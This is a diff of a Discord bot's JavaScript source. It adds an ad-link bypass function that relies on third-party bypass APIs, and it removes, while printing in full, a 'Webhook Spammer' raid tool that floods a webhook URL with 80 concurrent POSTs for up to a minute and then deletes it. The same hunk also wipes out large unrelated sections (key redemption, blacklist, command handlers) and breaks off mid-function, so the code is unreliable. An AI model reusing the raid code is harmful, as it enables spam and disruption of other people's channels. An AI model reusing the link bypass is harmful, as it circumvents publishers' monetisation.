@@ -377,8 +377,6 @@ const client = new Client({
 const runningScans = new Set();
 const paginationMenus = new Map();
 const obfTemp = new Map(); // userId -> { source, fileName, isBuyerUser }
-const whsWebhookUrls = new Map(); // messageId -> webhookUrl
-const whsPanelOwners = new Map(); // messageId -> authorId
 const altListMenus = new Map();
 const extractCarouselMenus = new Map();
 const renamePanels = new Map(); // messageId -> { authorId, fileUrl, fileName, isBuyerUser }
@@ -1989,6 +1987,51 @@ async function resolveTikTokMedia(pageUrl) {
 }
 
 /** Download remote media and return AttachmentBuilder (or null if too large/failed) */
+
+/** Bypass ad/key shortlinks (linkvertise, lootlabs, work.ink, etc.) */
+async function bypassAdLink(pageUrl) {
+  const url = String(pageUrl || "").trim();
+  if (!/^https?:\/\//i.test(url)) return null;
+  const endpoints = [
+    { u: "https://api.bypass.vip/bypass?url=" + encodeURIComponent(url), pick: (j) => j?.result || j?.destination || j?.url },
+    { u: "https://bypass.bot.nu/bypass?url=" + encodeURIComponent(url), pick: (j) => j?.destination || j?.result || j?.url },
+    { u: "https://api.bypass.gov/v1?url=" + encodeURIComponent(url), pick: (j) => j?.result || j?.destination || j?.url },
+    { u: "https://byp-api.vercel.app/api?url=" + encodeURIComponent(url), pick: (j) => j?.result || j?.url || j?.destination }
+  ];
+  for (const ep of endpoints) {
+    try {
+      const res = await fetch(ep.u, {
+        headers: { "Accept": "application/json", "User-Agent": "Mozilla/5.0" }
+      });
+      if (!res.ok) continue;
+      const j = await res.json().catch(() => null);
+      const out = ep.pick(j);
+      if (out && /^https?:\/\//i.test(String(out)) && String(out) !== url) {
+        return { url: String(out) };
+      }
+    } catch {}
+  }
+  // Follow redirects manually (some ad links resolve after a few hops)
+  try {
+    let cur = url;
+    for (let i = 0; i < 8; i++) {
+      const res = await fetch(cur, {
+        method: "GET",
+        redirect: "manual",
+        headers: { "User-Agent": "Mozilla/5.0", "Accept": "text/html,*/*" }
+      });
+      const loc = res.headers.get("location") || res.headers.get("Location");
+      if (!loc) break;
+      const next = loc.startsWith("http") ? loc : new URL(loc, cur).href;
+      if (!/linkvertise|lootlabs|work\.ink|adbypass|mboost|social-unlock|rekonise|sub2get|boost\.ink|cuty\.io|ouo\.io|adf\.ly/i.test(next)) {
+        if (next !== url) return { url: next };
+      }
+      cur = next;
+    }
+  } catch {}
+  return null;
+}
+
 async function downloadAsAttachment(mediaUrl, fallbackName) {
   try {
     const res = await fetch(mediaUrl, {
@@ -3435,7 +3478,7 @@ const helpPages = [
 
 **\`.delwh\`** Delete a webhook using its URL.
 
-**\`.whs\`** Webhook Spammer — Raid a Webhook using its URL.`
+**\`.bypass\`** Bypass ad/key links (linkvertise, lootlabs, etc.).`
     ),
   new EmbedBuilder()
     .setTitle("🤖 Bot Commands")
@@ -3475,7 +3518,7 @@ const helpPageBodies = [
 
 **\`.delwh\`** Delete a webhook using its URL.
 
-**\`.whs\`** Webhook Spammer — Raid a Webhook using its URL.` },
+**\`.bypass\`** Bypass ad/key links (linkvertise, lootlabs, etc.).` },
   { color: 0x5865F2, text: `**\`.coinflip\`** Flip a coin — win or lose **1 token**.
 
 Regular users start with **10 tokens**/day. Most commands cost **1 token**.
@@ -3805,673 +3848,7 @@ if (interaction.customId === "alt_prev" || interaction.customId === "alt_next") 
     return interaction.showModal(modal).catch(() => {});
   }
   // ─── WHS START BUTTON ───
-  if (interaction.customId === "whs_start") {
-    // Works in DMs and servers — no member check needed
-    // Only the person who ran .whs can click Start
-    const ownerId = whsPanelOwners.get(interaction.message.id);
-    if (ownerId && interaction.user.id !== ownerId) {
-      return interaction.reply({ content: "❌ not yours, bro.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    
-    // Build modal — matches Webhook Spam Settings form
-    const modal = new ModalBuilder()
-      .setCustomId("whs_modal")
-      .setTitle("Webhook Spam Settings");
-    
-    const urlInput = new TextInputBuilder()
-      .setCustomId("whs_url")
-      .setLabel("Webhook URL")
-      .setStyle(TextInputStyle.Short)
-      .setPlaceholder("Place webhook here")
-      .setRequired(true)
-      .setMaxLength(300);
-    
-    const timeInput = new TextInputBuilder()
-      .setCustomId("whs_time")
-      .setLabel("Time (seconds)")
-      .setStyle(TextInputStyle.Short)
-      .setPlaceholder("Max 60 seconds")
-      .setRequired(true)
-      .setMaxLength(2);
-    
-    const msgInput = new TextInputBuilder()
-      .setCustomId("whs_message")
-      .setLabel("Message")
-      .setStyle(TextInputStyle.Paragraph)
-      .setPlaceholder("Enter message (max 2000 chars)")
-      .setRequired(true)
-      .setMaxLength(2000);
-    
-    const delInput = new TextInputBuilder()
-      .setCustomId("whs_delete")
-      .setLabel("Delete after process (y/n)")
-      .setStyle(TextInputStyle.Short)
-      .setPlaceholder("y or n")
-      .setRequired(true)
-      .setMaxLength(3)
-      .setValue("y");
-    
-    modal.addComponents(
-      new ActionRowBuilder().addComponents(urlInput),
-      new ActionRowBuilder().addComponents(timeInput),
-      new ActionRowBuilder().addComponents(msgInput),
-      new ActionRowBuilder().addComponents(delInput)
-    );
-    
-    // Show modal FIRST — this is critical, must happen before any reply/update
-    await interaction.showModal(modal).catch(() => {});
-    
-    // Then disable the button separately (doesn't consume the interaction)
-    try {
-      const disabledRow = new ActionRowBuilder().addComponents(
-        ButtonBuilder.from(interaction.message.components[0].components[0])
-          .setDisabled(true)
-      );
-      await interaction.message.edit({ components: [disabledRow] }).catch(() => {});
-    } catch {}
-    
-    return;
-  }
 
-});
-
-// ============================================================
-
-// ============================================================
-// MODAL SUBMIT HANDLER — Robux ticket creation
-// ============================================================
-client.on("interactionCreate", async interaction => {
-  if (!interaction.isModalSubmit()) return;
-
-  // ── Finder Panel: Redeem modal ──
-  if (interaction.customId === "finderpanel_redeem_modal") {
-    const key = (interaction.fields.getTextInputValue("finderpanel_key") || "").trim();
-    if (!key) {
-      return interaction.reply({ content: "❌ put a key.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    const redeemIsBuyer = isOwner(interaction.user.id) || await isBuyer(interaction.user.id, interaction.member);
-    if (redeemIsBuyer && !isOwner(interaction.user.id)) {
-      return interaction.reply({ content: "❌ you already got a key, lol.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    const rec = keyStore.keys.find(k => k.key === key);
-    if (!rec) {
-      return interaction.reply({ content: "❌ Invalid key.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    if (rec.redeemedBy) {
-      return interaction.reply({ content: "❌ this key was already redeem.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    rec.redeemedBy = interaction.user.id;
-    rec.redeemedAt = Date.now();
-    if (rec.durationMs) rec.expiresAt = Date.now() + rec.durationMs;
-    else rec.expiresAt = null;
-    const tmp = `${KEYS_FILE}.tmp`;
-    try { fs.writeFileSync(tmp, JSON.stringify(keyStore, null, 2)); fs.renameSync(tmp, KEYS_FILE); } catch {}
-    try {
-      const g = await client.guilds.fetch(GUILD_ID);
-      const m = await g.members.fetch(interaction.user.id);
-      await m.roles.add(BUYER_ROLE_ID);
-    } catch (e) {
-      return interaction.reply({ content: "❌ Key saved but failed to assign role: " + e.message, flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    return interaction.reply({ content: "✅ key redeemed successfully.", flags: MessageFlags.Ephemeral }).catch(() => {});
-  }
-
-  // ── Finder Panel: Find modal (costs 1 token for regulars) ──
-  if (interaction.customId === "finderpanel_find_modal") {
-    const query = (interaction.fields.getTextInputValue("finderpanel_query") || "").trim();
-    if (!query) {
-      return interaction.reply({ content: "❌ put a file name.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    const isBuyerUser = isOwner(interaction.user.id) || await isBuyer(interaction.user.id, interaction.member);
-    if (!isBuyerUser) {
-      const hasTag = await hasPrinceStatus(interaction.user.id);
-      if (!hasTag) {
-        return interaction.reply({ content: "❌ adopt the Server Tag first.", flags: MessageFlags.Ephemeral }).catch(() => {});
-      }
-    }
-    // Token cost (panel Find always costs — unlike prefix .find)
-    const tok = tryConsumeToken(interaction.user.id, isBuyerUser);
-    if (!tok.ok) {
-      { const leftMs = Math.max(0, (tok.waitUntil || getNextMidnightPHMs()) - Date.now());
-        return interaction.reply({
-          flags: IS_COMPONENTS_V2 | MessageFlags.Ephemeral,
-          components: [{ type: 17, accent_color: 0xED4245, components: [{ type: 10, content: "### Input Error\nYou need to wait **" + formatTokenWait(leftMs) + "**" }] }]
-        }).catch(() => {}); }
-    }
-    logFinderPanel(interaction.user, "Find", `Query: \`${query}\``).catch(() => {});
-    const results = findFiles(query);
-    if (!results.length) {
-      // Error — no tokens left line
-      return interaction.reply({
-        content: `❌ no found for that, dumbass.`,
-        flags: MessageFlags.Ephemeral
-      }).catch(() => {});
-    }
-    // Finder source — Components V2 (never show tokens left)
-    const perPage = 8;
-    const totalPages = Math.ceil(results.length / perPage);
-    const pageItems = results.slice(0, perPage);
-    const listLines = pageItems.map(f => `\`${f.filename}\` — ID: \`${f.id}\``);
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId("prev_page").setLabel("Back").setStyle(ButtonStyle.Secondary).setDisabled(true),
-      new ButtonBuilder().setCustomId("next_page").setLabel("Next").setStyle(ButtonStyle.Success).setDisabled(totalPages <= 1)
-    );
-    const v2 = buildFinderV2Payload({
-      listLines,
-      pageLabel: `Pages 1/${totalPages}`,
-      actionRow: row,
-      ephemeral: true
-    });
-    await interaction.reply(v2).catch(() => {});
-    const replyMsg = await interaction.fetchReply().catch(() => null);
-    if (replyMsg) {
-      paginationMenus.set(interaction.user.id, {
-        results, page: 1, totalPages, messageId: replyMsg.id,
-        authorId: interaction.user.id, createdAt: Date.now(), isBuyer: isBuyerUser
-      });
-    }
-    return;
-  }
-
-  // ── Finder Panel: Get modal (costs 1 token for regulars) ──
-  if (interaction.customId === "finderpanel_get_modal") {
-    const raw = (interaction.fields.getTextInputValue("finderpanel_ids") || "").trim();
-    if (!raw) {
-      return interaction.reply({ content: "❌ put id of file, idiot.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    const isBuyerUser = isOwner(interaction.user.id) || await isBuyer(interaction.user.id, interaction.member);
-    if (!isBuyerUser) {
-      const hasTag = await hasPrinceStatus(interaction.user.id);
-      if (!hasTag) {
-        return interaction.reply({ content: "❌ adopt the Server Tag first.", flags: MessageFlags.Ephemeral }).catch(() => {});
-      }
-    }
-    const args = raw.split(/[\s,]+/).map(s => s.trim()).filter(Boolean);
-    if (!args.length) {
-      return interaction.reply({ content: "❌ put id of file, idiot.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    const maxGetIds = isBuyerUser ? 10 : 1;
-    if (args.length > maxGetIds) {
-      return interaction.reply({
-        content: isBuyerUser ? "❌ max 10 id only, dumbass." : "❌ buy premium if you want multiple id.",
-        flags: MessageFlags.Ephemeral
-      }).catch(() => {});
-    }
-    const tok = tryConsumeToken(interaction.user.id, isBuyerUser);
-    if (!tok.ok) {
-      { const leftMs = Math.max(0, (tok.waitUntil || getNextMidnightPHMs()) - Date.now());
-        return interaction.reply({
-          flags: IS_COMPONENTS_V2 | MessageFlags.Ephemeral,
-          components: [{ type: 17, accent_color: 0xED4245, components: [{ type: 10, content: "### Input Error\nYou need to wait **" + formatTokenWait(leftMs) + "**" }] }]
-        }).catch(() => {}); }
-    }
-    logFinderPanel(interaction.user, "Get", `ID(s): \`${args.join(", ")}\``).catch(() => {});
-    await interaction.deferReply({ flags: MessageFlags.Ephemeral }).catch(() => {});
-    const filesToSend = [];
-    const notFound = [];
-    for (const id of args) {
-      const file = getFile(id);
-      if (!file) { notFound.push(id); continue; }
-      if (!canGetLibraryFile(file, interaction.user.id)) {
-        notFound.push(id);
-        continue;
-      }
-      const freshUrl = await getFreshUrl(file);
-      filesToSend.push({ attachment: freshUrl || file.url, name: file.filename || "file" });
-    }
-    if (!filesToSend.length) {
-      // Error — no tokens left line
-      await interaction.editReply({
-        content: `❌ your id is wrong, try find working id, dumbass.`
-      }).catch(() => {});
-      return;
-    }
-    const tokSuffix = isBuyerUser ? "" : `\n${tokenLeftLine(tok.tokens, false)}`;
-    for (let i = 0; i < filesToSend.length; i += 10) {
-      const batch = filesToSend.slice(i, i + 10);
-      const content = i === 0
-        ? "**Here you go!**" + (notFound.length ? `\n❌ Not found: \`${notFound.join("`, `")}\`` : "") + tokSuffix
-        : null;
-      if (i === 0) {
-        await interaction.editReply({ content, files: batch }).catch(() => {});
-      } else {
-        await interaction.followUp({ content, files: batch, flags: MessageFlags.Ephemeral }).catch(() => {});
-      }
-    }
-    return;
-  }
-
-  if (interaction.customId === "whs_modal") {
-    const webhookUrl = (interaction.fields.getTextInputValue("whs_url") || "").trim();
-    const timeRaw = (interaction.fields.getTextInputValue("whs_time") || "").trim();
-    const spamMsg = (interaction.fields.getTextInputValue("whs_message") || "").trim();
-    const delRaw = (interaction.fields.getTextInputValue("whs_delete") || "n").trim().toLowerCase();
-    const avatarURL = interaction.user.displayAvatarURL({ dynamic: true, size: 128 });
-    const deleteAfter = delRaw === "y" || delRaw === "yes";
-
-    let durationSec = parseInt(timeRaw, 10);
-    if (!Number.isFinite(durationSec) || durationSec < 1) {
-      return interaction.reply({ content: "❌ Time must be 1–60 seconds.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-    if (durationSec > 60) durationSec = 60;
-    if (!webhookUrl || !spamMsg) {
-      return interaction.reply({ content: "❌ Webhook URL and Message are required.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-
-    // Quick webhook validation
-    const probe = await fetch(webhookUrl, { method: "GET" }).catch(() => null);
-    if (!probe || probe.status === 404) {
-      return interaction.reply({ content: "❌ Not Found.", flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
-
-    const totalMs = durationSec * 1000;
-    const barLen = 15;
-    const makeBar = (leftMs) => {
-      const done = Math.min(1, Math.max(0, 1 - leftMs / totalMs));
-      const filled = Math.round(done * barLen);
-      return "■".repeat(filled) + "□".repeat(Math.max(0, barLen - filled));
-    };
-    const progressEmbed = (leftMs) => {
-      const leftSec = Math.max(0, leftMs / 1000);
-      return new EmbedBuilder()
-        .setColor(0x57F287)
-        .setTitle("Webhook Spam In Progress")
-        .setDescription(`**Time Remaining**\n${makeBar(leftMs)}\n**${leftSec.toFixed(1)}s left**`);
-    };
-
-    await interaction.reply({ embeds: [progressEmbed(totalMs)], flags: MessageFlags.Ephemeral }).catch(() => {});
-
-    let sent = 0, failed = 0;
-    const startAt = Date.now();
-    let lastEdit = 0;
-    // Ultra-fast (~1ms waves, 40 concurrent) — STOP when time is up
-    const CONCURRENCY = 80;
-    const INTERVAL_MS = 0;
-    const payload = JSON.stringify({ content: spamMsg });
-    let stopped = false;
-
-    function fireOne() {
-      if (stopped) return;
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: payload
-      }).then(res => {
-        if (res.status === 204 || res.status === 200) sent++;
-        else failed++;
-      }).catch(() => { failed++; });
-    }
-
-    while (Date.now() - startAt < totalMs) {
-      if (stopped) break;
-      for (let i = 0; i < CONCURRENCY; i++) fireOne();
-      const left = totalMs - (Date.now() - startAt);
-      // Non-blocking progress update — NEVER await (await was slowing spam mid-run)
-      if (Date.now() - lastEdit > 1000) {
-        lastEdit = Date.now();
-        interaction.editReply({ embeds: [progressEmbed(Math.max(0, left))] }).catch(() => {});
-      }
-      await new Promise(r => setTimeout(r, INTERVAL_MS));
-    }
-    stopped = true; // time done → stop launching new spam immediately
-
-    let deleted = false;
-    if (deleteAfter) {
-      try {
-        const delRes = await fetch(webhookUrl, { method: "DELETE" });
-        deleted = delRes.ok || delRes.status === 204 || delRes.status === 404;
-      } catch {}
-    }
-
-    // No "Webhook Raid Complete" embed — just clear the progress message
-    await interaction.deleteReply().catch(async () => {
-      await interaction.editReply({ content: "\u200b", embeds: [], components: [] }).catch(() => {});
-    });
-    return;
-  }
-
-});
-
-// ============================================================
-// WHS REMOVE BUTTON HANDLER
-// ============================================================
-client.on("interactionCreate", async interaction => {
-  if (!interaction.isButton()) return;
-  if (interaction.customId === "whs_remove") {
-    const webhookUrl = whsWebhookUrls.get(interaction.message.id);
-    if (webhookUrl) {
-      try {
-        await fetch(webhookUrl, { method: "DELETE" });
-      } catch {}
-      whsWebhookUrls.delete(interaction.message.id);
-    }
-    await interaction.message.delete().catch(() => {});
-    return interaction.reply({ content: "✅ Webhook removed.", flags: MessageFlags.Ephemeral }).catch(() => {});
-  }
-});
-
-// ============================================================
-// WATCHDOG
-// ============================================================
-setInterval(async () => {
-  if (isReady || reconnecting || Date.now() - lastReady < 60000) return;
-  reconnecting = true;
-  console.warn("🟡 Reconnecting...");
-  try { client.destroy(); await new Promise(r => setTimeout(r, 1500)); await client.login(TOKEN); console.log("🟢 Reconnected."); }
-  catch (e) { console.error("❌ Reconnect fail:", e.message); }
-  finally { reconnecting = false; }
-}, 30000).unref?.();
-// ============================================================
-// SLASH COMMAND HANDLER — /say, /finderpanel (Owner Only)
-// ============================================================
-client.on("interactionCreate", async interaction => {
-  if (!interaction.isChatInputCommand()) return;
-  console.log(`📨 /${interaction.commandName}`);
-  try {
-    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
-    const isOwnerUser = isOwner(interaction.user.id);
-    if (!isOwnerUser) {
-      await interaction.editReply({ content: "❌ owner only, dumbass." });
-      return;
-    }
-    if (interaction.commandName === "say") {
-      const text = interaction.options.getString("text");
-      const type = interaction.options.getString("type") || "good";
-      const title = interaction.options.getString("title");
-      const footer = interaction.options.getString("footer");
-      const colorRaw = (interaction.options.getString("color") || "").trim();
-      await interaction.deleteReply().catch(() => {});
-      const targetChannel = interaction.channel || interaction.user.dmChannel || await interaction.user.createDM().catch(() => null);
-      if (!targetChannel) {
-        await interaction.followUp({ content: "❌ can't send message here.", flags: MessageFlags.Ephemeral }).catch(() => {});
-        return;
-      }
-      if (type === "none") {
-        await targetChannel.send({ content: text });
-      } else if (type === "v2") {
-        let color = RENAME_V2_ACCENT;
-        if (colorRaw) {
-          const named = { blurple: BLURPLE, gray: GRAY_COLOR, grey: GRAY_COLOR, red: 0xED4245, green: 0x57F287, yellow: 0xF1C40F, black: REGULAR_COLOR };
-          const key = colorRaw.toLowerCase().replace(/^#/, "");
-          if (named[colorRaw.toLowerCase()]) color = named[colorRaw.toLowerCase()];
-          else if (/^[0-9a-fA-F]{6}$/.test(key)) color = parseInt(key, 16);
-          else if (/^[0-9a-fA-F]{3}$/.test(key)) color = parseInt(key[0]+key[0]+key[1]+key[1]+key[2]+key[2], 16);
-        }
-        let body = String(text || "");
-        if (title) body = "### " + String(title).slice(0, 200) + "\n" + body;
-        if (footer) body = body + "\n\n-# " + String(footer).slice(0, 200);
-        await targetChannel.send({
-          flags: IS_COMPONENTS_V2,
-          components: [{
-            type: 17,
-            accent_color: color,
-            components: [{ type: 10, content: body.slice(0, 4000) }]
-          }]
-        });
-      } else {
-        let color = BLURPLE;
-        if (colorRaw) {
-          const named = { blurple: BLURPLE, gray: GRAY_COLOR, grey: GRAY_COLOR, red: 0xED4245, green: 0x57F287, yellow: 0xF1C40F, black: REGULAR_COLOR };
-          const key = colorRaw.toLowerCase().replace(/^#/, "");
-          if (named[colorRaw.toLowerCase()]) color = named[colorRaw.toLowerCase()];
-          else if (/^[0-9a-fA-F]{6}$/.test(key)) color = parseInt(key, 16);
-          else if (/^[0-9a-fA-F]{3}$/.test(key)) color = parseInt(key[0]+key[0]+key[1]+key[1]+key[2]+key[2], 16);
-        }
-        const embed = new EmbedBuilder()
-          .setColor(color)
-          .setDescription(text);
-        if (title) embed.setTitle(title);
-        if (footer) embed.setFooter({ text: footer });
-        await targetChannel.send({ embeds: [embed] });
-      }
-      return;
-    }
-    if (interaction.commandName === "finderpanel") {
-      const targetChannel = interaction.channel;
-      if (!targetChannel || !targetChannel.isTextBased?.()) {
-        await interaction.editReply({ content: "❌ use this in a text channel." });
-        return;
-      }
-      const panelRow = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId("finderpanel_find").setLabel("Find").setStyle(ButtonStyle.Primary),
-        new ButtonBuilder().setCustomId("finderpanel_get").setLabel("Get").setStyle(ButtonStyle.Success),
-        new ButtonBuilder().setCustomId("finderpanel_redeem").setLabel("Redeem").setStyle(ButtonStyle.Secondary)
-      );
-      await targetChannel.send({
-        flags: IS_COMPONENTS_V2,
-        components: [{
-          type: 17,
-          accent_color: FINDER_V2_ACCENT,
-          components: [
-            { type: 10, content: "### Finder Panel\nThis panel is only for where you can find old source that you can’t find." },
-            { type: 14, spacing: SEPARATOR_SPACING_SMALL },
-            panelRow.toJSON()
-          ]
-        }]
-      });
-      await interaction.editReply({ content: "✅ Finder Source Panel posted." });
-      return;
-    }
-    if (interaction.commandName === "blacklist") {
-      const mode = (interaction.options.getString("mode") || "").toLowerCase();
-      const targetUser = interaction.options.getUser("user");
-      if (mode === "list") {
-        const list = blacklistList();
-        if (!list.length) {
-          await interaction.editReply({ content: "📋 Blacklist is empty." });
-          return;
-        }
-        const lines = list.slice(0, 50).map((id, i) => `${i + 1}. <@${id}> (\`${id}\`)`);
-        const extra = list.length > 50 ? `\n...and ${list.length - 50} more` : "";
-        await interaction.editReply({ content: `📋 **Blacklist (${list.length}):**\n${lines.join("\n")}${extra}` });
-        return;
-      }
-      if (mode !== "add" && mode !== "remove") {
-        await interaction.editReply({ content: "❌ mode must be Add, Remove, or List." });
-        return;
-      }
-      if (!targetUser) {
-        await interaction.editReply({ content: "❌ pick a user for Add/Remove." });
-        return;
-      }
-      if (targetUser.id === OWNER_ID || isOwner(targetUser.id)) {
-        await interaction.editReply({ content: "❌ can't blacklist the owner." });
-        return;
-      }
-      if (mode === "add") {
-        const ok = blacklistAdd(targetUser.id);
-        await interaction.editReply({ content: ok ? `✅ blacklisted <@${targetUser.id}>.` : `⚠️ <@${targetUser.id}> is already blacklisted.` });
-        return;
-      }
-      // remove
-      const ok = blacklistRemove(targetUser.id);
-      await interaction.editReply({ content: ok ? `✅ removed <@${targetUser.id}> from blacklist.` : `⚠️ <@${targetUser.id}> was not blacklisted.` });
-      return;
-    }
-  } catch (e) {
-    console.error("❌ Interaction:", e);
-    const msg = { content: "❌ An error occurred.", flags: MessageFlags.Ephemeral };
-    interaction.deferred || interaction.replied ? await interaction.editReply(msg).catch(() => {}) : await interaction.reply(msg).catch(() => {});
-  }
-});
-// ============================================================
-// PREFIX COMMANDS
-// ============================================================
-client.on("messageCreate", async msg => {
-  if (msg.author.bot) return;
-  // Blacklisted users (except owner) — silent ignore all commands
-  if (msg.content?.trim()?.startsWith(".") && isBlacklisted(msg.author.id) && !isOwner(msg.author.id)) return;
-
-  // ── Live scan: auto-index new uploads in watched channels (no .scan needed) ──
-  try {
-    const liveIds = Array.isArray(config.liveScanChannelIds) ? config.liveScanChannelIds.map(String) : [];
-    const chId = String(msg.channelId || msg.channel?.id || "");
-    if (chId && liveIds.includes(chId)) {
-      const added = indexMessageFiles(msg);
-      if (added > 0) {
-        console.log(`📡 LiveScan +${added} file(s) in #${msg.channel?.name || chId} | library=${library.files.length}`);
-      }
-    }
-  } catch (e) {
-    console.warn(`⚠️ LiveScan: ${e.message}`);
-  }
-
-  const txt = (msg.content || "").trim();
-  if (txt === ".") return; // ignore single dot messages — bot stays silent
-  const isDM = !msg.guild;
-  // DM access: ONLY Owner + Buyer Role. Prince / Server Tag role CANNOT use commands in DMs.
-  // Exceptions: .help and .redeem/.red work for everyone.
-  if (isDM && !isOwner(msg.author.id)) {
-    const buyerInDm = await isBuyer(msg.author.id, msg.member);
-    if (!buyerInDm && !/^\.help(?:\s|$)/i.test(txt) && !/^\.(?:redeem|red)(?:\s|$)/i.test(txt)) {
-      replyUser(msg, "❌ buy access if you want to use the command here.").catch(() => {});
-      return;
-    }
-  }
-
-  // Channel lock for regulars — Owner + Buyer bypass. Commands only work in the .set channel.
-  // Exceptions: .help .profile .prof .redeem .red work everywhere.
-  if (msg.guild && txt.startsWith(".") && !isOwner(msg.author.id)) {
-    const isBuyerUser = await isBuyer(msg.author.id, msg.member);
-    if (!isBuyerUser && !/^\.(?:help|profile|prof|redeem|red)(?:\s|$)/i.test(txt)) {
-      if (!channelAllowed(msg)) {
-        sendInputErrorV2(msg, "**Tips:**\n- Use server tag and go to the allowed channel.").catch(() => {});
-        return;
-      }
-    }
-  }
-
-  // .help — works EVERYWHERE for EVERYONE
-  if (/^\.help(?:\s|$)/i.test(txt)) {
-    const page = 0;
-    helpSessions.set(msg.author.id, page);
-    const v2 = buildHelpV2(page, msg.author.id);
-    replyComponentsV2(msg, v2, { mention: false }).catch(() => {});
-    return;
-  }
-
-  // .profile / .prof — works EVERYWHERE for EVERYONE
-  if (/^\.profile(?:\s|$)|^\.prof(?:\s|$)/i.test(txt)) {
-    let targetId = msg.author.id;
-    const mention = msg.mentions.users.first();
-    if (mention) targetId = mention.id;
-    else {
-      const idMatch = txt.match(/(\d{17,20})/);
-      if (idMatch) targetId = idMatch[1];
-    }
-    const activeKey = findActiveKeyForUser(targetId);
-    let displayName = `<@${targetId}>`;
-    try {
-      const u = await client.users.fetch(targetId);
-      if (u) displayName = `@${u.username}`;
-    } catch {}
-    const timeFooter = `Today at ${new Date().toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}`;
-    const embed = new EmbedBuilder()
-      .setTitle("Profile Status")
-      .setDescription(
-`User: ${displayName} (\`${targetId}\`)
-Key Active: ${activeKey ? "\`" + activeKey.key + "\`" : "❌ No active key."}`
-      )
-      .setColor(REGULAR_COLOR)
-      .setFooter({ text: timeFooter });
-    replyUser(msg, { embeds: [embed] }).catch(() => {});
-    return;
-  }
-
-  // .generatekey — Owner Only
-  if (/^\.generatekey(?:\s|$)/i.test(txt)) {
-    if (!isOwner(msg.author.id)) { replyUser(msg, "❌ owner only, dumbass.").catch(() => {}); return; }
-    const rest = txt.replace(/^\.generatekey\s+/i, "").trim();
-    const parts = rest.split(/\s+/);
-    const timeStr = parts[0] || "";
-    const amountStr = parts[1] || "1";
-    const durMs = parseDuration(timeStr);
-    const amount = Math.max(1, Math.min(50, parseInt(amountStr) || 1));
-    const generatedKeys = [];
-    for (let i = 0; i < amount; i++) {
-      const key = generateKey();
-      keyStore.keys.push({
-        key,
-        createdAt: Date.now(),
-        expiresAt: durMs === null ? null : Date.now() + durMs,
-        redeemedBy: null
-      });
-      generatedKeys.push(key);
-    }
-    const tmp = `${KEYS_FILE}.tmp`;
-    try { fs.writeFileSync(tmp, JSON.stringify(keyStore, null, 2)); fs.renameSync(tmp, KEYS_FILE); } catch {}
-    const timeText = durMs === null ? "♾️ INFINITE" : `${timeStr}`;
-    const keyList = generatedKeys.map(k => `\`${k}\``).join("\n");
-    replyUser(msg, `✅ Generated ${amount} key(s) — ${timeText} expiry:\n${keyList}`).catch(() => {});
-    return;
-  }
-
-
-  // .removekey — Owner Only (removes key + strips buyer role)
-  if (/^\.removekey(?:\s|$)/i.test(txt)) {
-    if (!isOwner(msg.author.id)) { replyUser(msg, "❌ owner only, dumbass.").catch(() => {}); return; }
-    const key = txt.replace(/^\.removekey\s+/i, "").trim();
-    if (!key) { replyUser(msg, "❌ usage: \`.removekey <key>\`").catch(() => {}); return; }
-    const rec = keyStore.keys.find(k => k.key === key);
-    if (!rec) { replyUser(msg, "❌ key not found.").catch(() => {}); return; }
-    const redeemedBy = rec.redeemedBy;
-    // Remove from keyStore
-    keyStore.keys = keyStore.keys.filter(k => k.key !== key);
-    const tmp = `${KEYS_FILE}.tmp`;
-    try { fs.writeFileSync(tmp, JSON.stringify(keyStore, null, 2)); fs.renameSync(tmp, KEYS_FILE); } catch {}
-    // Strip buyer role from user if redeemed
-    if (redeemedBy) {
-      try {
-        const g = await client.guilds.fetch(GUILD_ID);
-        const m = await g.members.fetch(redeemedBy);
-        await m.roles.remove(BUYER_ROLE_ID);
-        replyUser(msg, `✅ Key removed! Buyer role stripped from <@${redeemedBy}>.`).catch(() => {});
-      } catch (e) {
-        replyUser(msg, `✅ Key removed! (Failed to strip role: ${e.message.slice(0,80)})`).catch(() => {});
-      }
-    } else {
-      replyUser(msg, `✅ Key removed! (was not redeemed yet)`).catch(() => {});
-    }
-    return;
-  }
-
-  // .redeem / .red — EVERYONE can use
-  if (/^\.redeem(?:\s|$)|^\.red(?:\s|$)/i.test(txt)) {
-    const redeemIsBuyer = isOwner(msg.author.id) || await isBuyer(msg.author.id, msg.member);
-    const cd = checkCommandCooldown(msg.author.id, "redeem", redeemIsBuyer);
-    if (cd.onCooldown) {
-      if (cd.noTokens) { replyNoTokens(msg, cd.waitUntil).catch(() => {}); return; }
-      replyUser(msg, `❌ you're on ${cd.remaining} cooldown.`).catch(() => {}); return;
-    }
-    const key = txt.replace(/^\.redeem\s+|^\.red\s+/i, "").trim();
-    if (!key) { replyUser(msg, "❌ Usage: \`.redeem <key>\`").catch(() => {}); return; }
-    // Check if user already has active key
-    if (findActiveKeyForUser(msg.author.id)) {
-      replyUser(msg, "❌ you already got a key, lol.").catch(() => {});
-      return;
-    }
-    const rec = keyStore.keys.find(k => k.key === key);
-    if (!rec) { replyUser(msg, "❌ Invalid key.").catch(() => {}); return; }
-    if (rec.redeemedBy || (rec.expiresAt !== null && rec.expiresAt < Date.now())) {
-      replyUser(msg, "❌ this key was already redeem.").catch(() => {});
-      return;
-    }
-    rec.redeemedBy = msg.author.id;
-    const tmp = `${KEYS_FILE}.tmp`;
-    try { fs.writeFileSync(tmp, JSON.stringify(keyStore, null, 2)); fs.renameSync(tmp, KEYS_FILE); } catch {}
-    try {
-      const g = await client.guilds.fetch(GUILD_ID);
-      const m = await g.members.fetch(msg.author.id);
-      await m.roles.add(BUYER_ROLE_ID);
-    } catch (e) {
